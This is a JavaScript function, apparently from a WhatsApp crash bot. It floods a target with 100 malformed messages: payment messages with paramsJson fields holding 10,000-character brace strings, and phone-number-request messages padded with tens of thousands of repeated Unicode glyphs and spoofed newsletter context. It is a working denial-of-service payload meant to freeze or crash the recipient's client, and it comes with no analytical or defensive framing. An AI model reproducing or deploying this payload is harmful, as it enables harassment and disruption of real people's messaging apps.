async function inTsX(sock, target) {
  for (let i = 0; i < 80; i++) {
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            sendPaymentMessage: {
              noteMessage: {
                extendedTextMessage: {
                  text: " # 🚯 - r4Ldz`Trash • NuLL 1Nd3x ",
                  matchedText: "t.me/rraldz $$$ Wa.me/stickerpack/@voidp",
                  description: " ─Nxpeɔt¡on`r4Ldz. ",
                  title: "X",
                  paymentLinkMetadata: {
                    button: {
                      displayText: "X"
                    },
                    header: {
                      headerType: 1
                    },
                    provider: {
                      paramsJson: "{{".repeat(5000)
                    }
                  },
                  linkPreviewMetadata: {
                    paymentLinkMetadata: {
                      button: {
                        displayText: "X"
                      },
                      header: {
                        headerType: 1
                      },
                      provider: {
                        paramsJson: "{{".repeat(5000)
                      }
                    },
                    urlMetadata: {
                      fbExperimentId: 999
                    },
                    fbExperimentId: 888,
                    linkMediaDuration: 555,
                    socialMediaPostType: 1221
                  }
                }
              }
            }
          }
        }
      },
      {}
    );
  }

  for (let r = 0; r < 20; r++) {
    await sock.relayMessage(
      target,
      {
        requestPhoneNumberMessage: {
          skipType: 7,
          contextInfo: {
            remoteJid: "status@broadcast",
            externalAdReply: {
              title: "𑇂𑆵𑆴𑆿".repeat(2500),
              body: "𑇂𑆵𑆴𑆿".repeat(2500),
              mediaType: "DOCUMENT",
              renderLargerThumbnail: true,
              merchantUrl: "https://raldzz.xyz/" + "𑇂𑆵𑆴𑆿".repeat(2500),
              containsAutoReply: true,
              showAdAttribution: true
            },
            quotedMessage: {
              conversation: "𑇂𑆵𑆴𑆿".repeat(15000)
            },
            mentionedJid: ["0@s.whastapp.net"],
            forwardedNewsletterMessageInfo: {
              newsletterJid: "666-666@g.us",
              serverMessageId: 1,
              newsletterName: "؂ن؃؄ٽ؂ن؃",
              contentType: "UPDATE"
            }
          }
        }
      },
      {
        participant: {
          jid: target
        }
      }
    );
  }
}
